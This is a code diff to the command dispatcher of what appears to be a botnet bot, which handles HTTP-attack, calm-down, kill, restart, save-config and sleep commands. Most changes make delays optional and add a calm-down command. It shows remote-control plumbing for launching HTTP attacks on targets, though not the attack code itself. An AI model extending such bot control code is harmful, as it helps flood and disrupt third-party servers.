@@ -255,16 +255,36 @@ public class CoreController {
             }
           }
         }
-        final Interval attackHttpDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
-        waitBeforeCommand(attackHttpDelay.getRandomDuration(), KILL);
+
+        final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
+        if (attackHttpDelay != null) {
+          waitBeforeCommand(attackHttpDelay.getRandomDuration(), KILL);
+        }
+
         scheduleHttpAttack(method, targets);
+
+        break;
+
+      case CALMDOWN:
+        final Interval calmdownDelay = (Interval) cmd.getParams().get("delay");
+        if (calmdownDelay != null) {
+          waitBeforeCommand(calmdownDelay.getRandomDuration(), CALMDOWN);
+        }
+
+        calmdown();
+
         break;
 
       case KILL:
-        final Interval killTimeout = (Interval) cmd.getParams().getOrDefault("timeout", Interval.ZERO);
-        final Interval killDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
-        waitBeforeCommand(killDelay.getRandomDuration(), KILL);
+        final Interval killTimeout = (Interval) cmd.getParams().get("timeout");
+
+        final Interval killDelay = (Interval) cmd.getParams().get("delay");
+        if (killDelay != null) {
+          waitBeforeCommand(killDelay.getRandomDuration(), KILL);
+        }
+
         kill(killTimeout.getRandomDuration());
+
         break;
 
       case RESTART:
@@ -272,15 +292,24 @@ public class CoreController {
         if (resource == null || resource.isEmpty()) {
           throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
         }
-        final Interval restartDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
-        waitBeforeCommand(restartDelay.getRandomDuration(), RESTART);
+
+        final Interval restartDelay = (Interval) cmd.getParams().get("delay");
+        if (restartDelay != null) {
+          waitBeforeCommand(restartDelay.getRandomDuration(), RESTART);
+        }
+
         restartBot(resource);
+
         break;
 
       case SAVE_CONFIG:
-        final Interval saveConfigDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
-        waitBeforeCommand(saveConfigDelay.getRandomDuration(), SAVE_CONFIG);
+        final Interval saveConfigDelay = (Interval) cmd.getParams().get("delay");
+        if (saveConfigDelay != null) {
+          waitBeforeCommand(saveConfigDelay.getRandomDuration(), SAVE_CONFIG);
+        }
+
         saveConfig();
+
         break;
 
       case SLEEP:
@@ -288,9 +317,14 @@ public class CoreController {
         if (sleepTimeout == null) {
           throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
         }
-        final Interval sleepDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
-        waitBeforeCommand(sleepDelay.getRandomDuration(), SLEEP);
+
+        final Interval sleepDelay = (Interval) cmd.getParams().get("delay");
+        if (sleepDelay != null) {
+          waitBeforeCommand(sleepDelay.getRandomDuration(), SLEEP);
+        }
+
         sleep(sleepTimeout.getRandomDuration());
+
         break;
 
       default:
@@ -359,6 +393,20 @@ public class CoreController {
   }
 
   /**
+   * Executes the command `KILL`.
+   * All resources are released within the specified timeout.
+   * @param timeout the time to shutdown.
+   */
+  private static void kill(Duration timeout) {
+    LOGGER.traceEntry("timeout={}", timeout);
+    LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
+    freeResources(timeout);
+    LOGGER.info("Bot shut down");
+    changeState(BotState.DEAD);
+    LOGGER.traceExit();
+  }
+
+  /**
    * Executes the bot command `RESTART`.
    * @param resource the path to the CONTROLLERS initialization resource.
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
@@ -399,20 +447,6 @@ public class CoreController {
     }
     LOGGER.info("Awake");
     changeState(BotState.EXECUTION);
-    LOGGER.traceExit();
-  }
-
-  /**
-   * Executes the command `KILL`.
-   * All resources are released within the specified timeout.
-   * @param timeout the time to shutdown.
-   */
-  private static void kill(Duration timeout) {
-    LOGGER.traceEntry("timeout={}", timeout);
-    LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
-    freeResources(timeout);
-    LOGGER.info("Bot shut down");
-    changeState(BotState.DEAD);
     LOGGER.traceExit();
   }
 
@@ -509,11 +543,7 @@ public class CoreController {
    */
   private static void freeResources(Duration timeout) {
     LOGGER.traceEntry("timeout={}", timeout);
-    if (timeout.getAmount() > 0) {
-      POOL.shutdown(timeout);
-    } else {
-      POOL.kill();
-    }
+    POOL.kill(timeout);
     LOGGER.traceExit();
   }
 
@@ -536,6 +566,15 @@ public class CoreController {
     final TimeUnit unit = timeout.getUnit();
     LOGGER.info("Waiting for polling: {} {}", amount, unit);
     unit.sleep(amount);
+  }
+
+  /**
+   * Executes command `CALMDOWN`.
+   */
+  private static void calmdown() {
+    LOGGER.info("Calming down bot...");
+    POOL.calmdown();
+    LOGGER.info("Bot calmed down");
   }
 
 }
